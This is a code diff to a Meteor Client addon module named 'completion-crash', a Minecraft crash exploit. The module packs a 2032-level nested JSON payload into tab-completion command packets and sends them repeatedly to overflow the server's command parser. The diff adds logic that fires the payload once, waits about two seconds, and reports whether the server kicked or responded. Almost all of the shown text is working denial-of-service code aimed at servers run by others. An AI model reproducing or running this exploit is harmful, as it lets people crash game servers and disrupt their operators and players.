@@ -1,6 +1,8 @@
 package com.example.addon.modules.crash;
 
 import com.example.addon.AddonTemplate;
+import meteordevelopment.meteorclient.events.game.GameLeftEvent;
+import meteordevelopment.meteorclient.events.packets.PacketEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.settings.IntSetting;
 import meteordevelopment.meteorclient.settings.Setting;
@@ -36,20 +38,46 @@ public class CompletionCrash extends Module {
         .defaultValue(3).min(1).sliderMax(12).build()
     );
 
+    private final GracefulResponse gr = new GracefulResponse(sgGeneral);
+    private boolean fired = false;
+    private int waitTicks = 0;
+
     public CompletionCrash() {
         super(AddonTemplate.CRASH_CATEGORY, "completion-crash",
             "Sends a deeply nested JSON structure as a tab-completion query, targeting command parser stack overflow.");
     }
 
+    @Override
+    public void onActivate() { fired = false; waitTicks = 0; gr.onActivate(); }
+
     @EventHandler
     private void onTick(TickEvent.Post event) {
         if (mc.player == null) return;
-        String overflow = generateNestedJson(2032);
-        String cmd = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
-        for (int i = 0; i < packets.get(); i++) {
-            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, cmd));
+        gr.tick();
+        if (!fired) {
+            String overflow = generateNestedJson(2032);
+            String cmd = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
+            for (int i = 0; i < packets.get(); i++) {
+                mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, cmd));
+            }
+            gr.markFired();
+            fired = true;
+            waitTicks = 40; // wait ~2s for a kick/response before grading
+            return;
         }
-        toggle();
+        if (--waitTicks <= 0) {
+            gr.report(l -> info("%s", l));
+            toggle();
+        }
+    }
+
+    @EventHandler
+    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }
+
+    @EventHandler
+    private void onGameLeft(GameLeftEvent event) {
+        gr.onKick();
+        if (isActive()) toggle();
     }
 
     private static String generateNestedJson(int levels) {
